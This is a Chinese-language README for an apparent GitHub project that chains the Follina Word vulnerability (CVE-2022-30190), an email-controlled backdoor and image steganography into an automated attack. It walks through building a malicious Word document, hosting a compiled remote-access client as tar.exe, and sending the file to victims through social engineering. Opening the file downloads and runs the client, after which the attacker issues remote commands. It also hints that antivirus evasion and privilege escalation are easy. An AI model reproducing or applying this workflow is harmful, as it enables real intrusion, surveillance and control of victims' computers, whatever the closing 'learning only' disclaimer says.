# AmzWord

一个基于CVE-2022-30190，163邮箱后门，以及图片隐写的自动化攻击链实现。

感谢以下github仓库，我们参考并修改了部分代码，集成实现了我们的工作：

- [gdog](https://github.com/maldevel/gdog)
- [follina](https://github.com/Noxtal/follina)
- [virtual-reality](https://github.com/rokups/virtual-reality)

# 需求

gdog：

- Python 2.7
- PyCrypto module
- WMI module
- Enum34 module
- Netifaces module

follina：

- Python 3.x

# 使用&攻击流程

1. 利用follina.py构建恶意word文件，并打开http监听

   - 您可以更改代码中的默认名字和默认ip
   - 也可以使用`--ip`和`--output`来指定
   - 详细使用方法请参考[follina](https://github.com/Noxtal/follina)，我们没有更改使用接口
   - eg：`python follina.py --ip 100.100.100.100 --output maldoc.doc`

2. 修改gdog下的client.py和gdog.py，填入以下信息

   ```python
   gmail_user = 'your email'
   gmail_pwd = 'your pwd'
   server = "smtp server"
   imap_server = 'imap server'
   ```

3. 将client.py编译成tar.exe置于/follina/www下

4. 使用任意社会工程学方式发送给目标，只要受害者打开了word，就会自动下载tar.exe并执行

5. 攻击者本地运行gdog并发送命令控制目标机器，使用方式参见[follina](https://github.com/Noxtal/follina)

# 备注

1. 这只是一个攻击链实现的demo，运行的exe甚至可以在任务管理器里找到，这方便观察效果。我们并没有做免杀、隐藏、提权等操作，当然这些在Windows上并不困难，不是吗？
2. gdog项目时间有些久了，为了让他顺利运行起来我们花了很大力气，目前确定能实现的远控指令包括：执行命令、截屏、弹窗、关机、锁屏、传输文件，这些功能足以适应大多数的需求。
3. 不知道为什么，imap的SUBJECT搜索似乎有些问题，我们无法搜到目标主题的邮件，返回为空。我们只能采取其他方法，比如：读取所有未读邮件，筛选出目标，再将其他置为未读。这在受控用户较多时可能出现问题，有待解决。
4. 本项目一切仅供学习交流使用。